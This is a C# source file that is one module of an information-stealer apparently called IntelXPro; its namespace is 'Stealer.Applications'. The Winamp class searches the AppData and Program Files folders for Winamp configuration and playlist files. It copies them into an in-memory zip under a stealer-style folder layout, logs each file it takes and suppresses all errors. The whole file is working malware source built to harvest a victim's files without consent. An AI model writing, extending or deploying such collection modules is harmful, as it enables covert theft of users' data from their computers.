using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Winamp : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Winamp");
            string programFilesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Winamp");
            string programFilesX86Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Winamp");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Winamp";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(programFilesPath))
            {
                foundData |= CollectFromDirectory(programFilesPath, "ProgramFiles", zip, counterApplications);
            }

            if (Directory.Exists(programFilesX86Path))
            {
                foundData |= CollectFromDirectory(programFilesX86Path, "ProgramFilesX86", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "winamp.ini",
                    "winamp.m3u",
                    "studio.xnf"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\Winamp\\{location}\\{configFile}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
